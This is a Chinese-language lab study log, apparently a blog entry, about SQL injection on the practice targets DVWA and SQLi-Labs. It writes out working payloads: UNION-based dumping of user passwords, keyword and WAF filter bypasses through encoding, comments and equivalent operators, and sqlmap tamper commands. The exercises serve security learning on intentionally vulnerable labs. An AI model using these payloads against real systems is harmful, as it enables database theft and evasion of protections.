## 二、实操过程记录

### 阶段 1：分析 DVWA High 防护（20 分钟）

调到 High 之后先别急着打 payload，先看两样：查询语句长什么样、页面回显有几个位置。

```sql
# 正常请求（id 通过下拉框 POST 提交）
id=1
# 假条件
id=1 AND 1=2
```
防护机制分析：High 的查询是 SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1；id 被单引号包裹，且加了 LIMIT 1 只返回一行。

被拦截的 payload：直接 id=1 AND 1=2 会返回空，因为整串被当成字符串和 user_id 比较。

关键点：High 并没有做关键字过滤，它真正的门槛是「引号闭合 + LIMIT 1」。

### 阶段 2：闭合与 LIMIT 1 绕过（25 分钟）

先闭合引号，再用注释把后面的 LIMIT 1 去掉，最后用 -1 让原查询落空，UNION 的结果才会显示。

```sql
# 闭合引号 + 注释掉尾部
id=1' --
# 让原查询落空后联合查询
id=-1' UNION SELECT 1,2 --
# 取数据
id=-1' UNION SELECT database(),version() --
id=-1' UNION SELECT user,password FROM users --
```
测试结果：id=-1' UNION SELECT 1,2 -- 页面回显 1 和 2，说明两列且 UNION 生效。

是否有效：是。LIMIT 1 只限制原查询的结果行数，UNION 追加的行不受影响，只要第一行是我们的数据就能显示。

![High 级别 UNION 绕过成功](/images/csdn/week06/day-034-1.png)

### 阶段 3：关键字过滤绕过（30 分钟）

SQLi-Labs Less-25 会把 and / or 替换成空。这里才是真正需要「绕」的场景：同一件事换一种写法。

```sql
# 双写绕过（and 被删一次，拼回 and）
?id=1 anandd 1=1 --+
# 等价替换：用 && 代替 and
?id=1 && 1=1 --+
?id=1 || 1=1 --+
# 大小写混用
?id=1 aNd 1=1 --+
# 注释打断关键字
?id=1 /*!and*/ 1=1 --+
```
测试结果：&& 与 || 直接可用；双写 anandd 有效；大小写无效（Less-25 用 preg_replace 且带 /i）。

最省事的绕过：把 and 换成 &&、or 换成 ||。

![关键字过滤绕过（Less-25）](/images/csdn/week06/day-034-2.png)

### 阶段 4：编码与空格绕过（25 分钟）

有的 WAF 只拦原始字符，编码一次或两次就能过；有的只拦空格，换个分隔符就行。

```sql
# URL 单次编码
1%27%20or%201=1--
# 双重编码（绕过只解一层的 WAF）
1%2527%2520or%25201=1--
# 十六进制字符串（绕过引号过滤）
1' union select 0x61646d696e,2--   # 0x61646d696e = admin
# 空格替代
1'/**/or/**/1=1--
1'%09or%091=1--      # Tab
1'%0aor%0a1=1--      # 换行
1'or(1=1)--           # 括号
```
有效的编码方式：十六进制字符串（不受引号过滤影响）、双重编码（绕过只解一次的 WAF）。

成功的 payload：1' union select 0x61646d696e,2--

空格替代里最稳的是 /**/ 和 Tab(%09)，前者兼容性最好，后者最不容易被规则命中。

### 阶段 5：SQLMap tamper 脚本（30 分钟）

手工绕过适合验证，批量跑数据还是得靠 tamper。要理解每个 tamper 做了什么，而不是无脑叠加。

```bash
sqlmap --list-tampers
# 空格换注释 + 随机大小写
sqlmap -u "http://target/?id=1" --tamper=space2comment,randomcase
# 加 URL 编码
sqlmap -u "http://target/?id=1" --tamper=space2comment,charencode
# 用 between 替换比较符
sqlmap -u "http://target/?id=1" --tamper=between,randomcase,space2comment
```
常用 tamper：space2comment（空格→/**/）、randomcase（随机大小写）、charencode（URL 编码）、between（> 换 between）。

经验：挂太多 tamper 会让请求变形过度，本来能通的反而失败。先单个试，再加组合。

### 阶段 6：避坑记录

| 坑点 | 症状 | 解决办法 |
| --- | --- | --- |
| 以为 High 有 WAF | 一直找过滤规则 | 先看源码，High 只加了引号和 LIMIT 1 |
| 注释没生效 | 语法错误 | -- 后必须有空格，URL 里写 --+ 或 %23 |
| tamper 叠加过多 | 请求变形失败 | 单个验证后再组合 |
| 被拦后不知道谁拦的 | 无法定位 | 先用无害 payload 探测拦截规则 |

Q：怎么判断是 WAF 还是代码过滤？A：WAF 通常返回统一拦截页/状态码，代码过滤通常页面正常但数据被改。

Q：绕过思路的通用套路？A：换等价表达——大小写、注释、编码、替换关键字、替换分隔符。

## 三、实践心得

1. 绕过的本质不是「破解」，而是「找同一语义的另一种写法」。and 能写成 &&，空格能写成 /**/，引号能写成十六进制——数据库认的是语义，WAF 认的是字符串。

2. 今天最大的收获是先看源码再动手。DVWA High 根本没有关键字过滤，如果一开始就按「有 WAF」的思路硬绕，会浪费大量时间在不存在的问题上。

3. tamper 挂太多反而失败这条经验很实在：变形的目的不是更花，而是通过检测同时仍能被数据库正确解析。

## 四、重点与难点

1. 必须记住的知识点

① 绕过的四类手法：大小写、注释打断、编码、等价替换（关键字/分隔符）。

② `--` 后必须跟空格；`%23` 是 #，也是合法注释。

③ 十六进制字符串（0x...）本身不含引号，能绕过引号类过滤。

④ 先判断拦截者是谁（WAF 还是代码），再决定绕过方向。

2. 踩过的坑

① 一开始以为 DVWA High 有 WAF，试了半天大小写，结果它压根没过滤。

② `--` 后面漏了空格，注释没生效，误判为「被拦截」。

③ sqlmap 一次挂了四个 tamper，请求被改得面目全非，反而跑不出数据。

3. 需要补的课

① 补课：常见 WAF（安全狗、云锁、ModSecurity）的规则特征。

② 补课：分块传输、参数污染（HPP）这类非字符串层的绕过。

③ 预习：Day 035 二次注入与宽字节注入，绕过的是「转义」而不是「检测」。

## 六、今日总结

今天学的不是新漏洞，而是「同一件事的多种写法」。所有绕过都建立在一个前提上：检测方看的是字符串，执行方看的是语义，两者之间的缝隙就是空间。

最重要的一条经验是先分析再动手。DVWA High 的「防护」其实只是引号 + LIMIT 1，真正的 WAF 场景要去 Less-25 那种有过滤的关卡练。
